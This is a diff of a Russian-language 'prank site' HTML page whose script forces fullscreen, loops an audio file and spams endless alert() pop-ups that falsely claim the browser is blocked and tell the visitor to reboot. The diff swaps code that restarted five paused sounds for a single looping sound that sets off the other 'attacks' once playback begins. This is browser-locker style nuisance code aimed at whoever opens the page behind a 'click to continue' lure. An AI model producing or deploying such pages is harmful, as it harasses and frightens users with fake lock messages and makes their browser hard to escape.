@@ -2,7 +2,7 @@
 <head>
     <title>Сайт розыгрыш</title>
     <script>
-        let sounds = []; // Массив для звуков
+        let sound; // Один аудиоэлемент
 
         // Функция для включения полноэкранного режима
         function goFullscreen() {
@@ -18,25 +18,22 @@
         }
 
         function startAttack() {
-            // Включаем полноэкранный режим
-            goFullscreen();
+            // Включаем звук
+            sound = new Audio();
+            sound.src = 'ponos-mp3.mp3'; // Заменить на нужный файл
+            sound.loop = true;
+            sound.play();
 
-            // Создаём несколько аудиоэлементов
-            for (let i = 0; i < 5; i++) {
-                let sound = new Audio();
-                sound.src = 'ponos-mp3.mp3'; // Заменить на нужный файл
-                sound.loop = true;
-                sound.play();
-                sounds.push(sound);
-            }
+            // После того, как звук начнёт играть, включаем полноэкранный режим
+            sound.onplay = function() {
+                goFullscreen();
 
-            // Запуск звуков заново при попытке выключения
-            setInterval(() => {
-                sounds.forEach(sound => {
-                    if (sound.paused) sound.play();
-                });
-            }, 500);
+                // Запуск всех остальных атак после включения звука и полноэкранного режима
+                initiateAttack();
+            };
+        }
 
+        function initiateAttack() {
             // Запуск бесконечных alert()  
             setTimeout(function spamAlert() {
                 alert("Ваш браузер заблокирован! Перезагрузите устройство.");
@@ -125,3 +122,4 @@
     <h1>Нажми, чтобы продолжить</h1>
 </body>
 </html>
+
